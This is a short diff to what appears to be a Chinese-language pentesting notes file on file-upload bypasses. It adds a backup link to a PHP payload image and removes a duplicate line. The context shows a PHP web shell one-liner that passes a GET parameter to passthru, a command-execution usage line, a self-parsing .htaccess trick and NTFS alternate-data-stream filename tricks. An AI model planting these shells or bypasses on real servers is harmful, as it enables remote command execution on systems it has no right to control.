@@ -66,6 +66,7 @@ tags:
         用法:x.php?0=system post data:1=whoami,上面链接中的payload见如下phppayload
 
 <a href="https://www.idontplaydarts.com/images/phppng.png">phppayload</a>
+<a href="https://raw.githubusercontent.com/3xp10it/pic/master/phppng.png">phppayload_bak_link</a>
 
     5>https://www.nds.rub.de/media/attachments/files/2012/11/File-in-the-hole.pdf
         多种上传技巧:
@@ -88,7 +89,6 @@ tags:
             ###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
             -----------------------自解析.htaccess--------------------------------
 
-###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
         b)NTFS ADS
             1."file.asp::$data"=="file.asp"
             2."/folder:$i30:$Index_allocation"=="/folder"
